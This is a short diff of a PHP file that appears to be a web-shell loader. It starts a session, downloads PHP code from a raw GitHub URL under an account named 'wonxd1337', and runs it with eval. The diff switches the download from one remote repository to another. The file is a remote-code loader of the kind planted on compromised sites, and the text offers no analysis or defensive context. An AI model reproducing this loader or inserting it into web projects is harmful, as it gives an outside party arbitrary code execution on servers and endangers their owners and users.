@@ -1,4 +1,6 @@
 <?php
+?>
+<?php
 session_start();
 
 /**
@@ -30,6 +32,6 @@ function geturlsinfo($url) {
   return $url_get_contents_data;
 }
 
-  $a = geturlsinfo('https://raw.githubusercontent.com/wonxd1337/tun/refs/heads/main/index.php');
+  $a = geturlsinfo('https://raw.githubusercontent.com/wonxd1337/djs/refs/heads/main/index.php');
   eval('?>' . $a);
 ?>
